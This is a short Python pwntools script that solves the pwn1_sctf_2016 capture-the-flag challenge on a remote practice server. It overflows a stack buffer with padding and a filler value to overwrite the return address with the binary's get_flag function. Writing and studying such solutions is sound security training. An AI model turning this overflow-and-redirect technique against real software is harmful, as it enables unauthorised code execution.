from pwn import *

context.log_level = "debug"

exe = ELF("./pwn1_sctf_2016")
# r = process("./pwn1_sctf_2016")
r = remote("node4.buuoj.cn", 28531)

r.sendline(b"I" * 20 + p32(0xDEADBEEF) + p32(exe.sym["get_flag"]))
# here use strcpy so we can't full with zero-bytes
r.interactive()
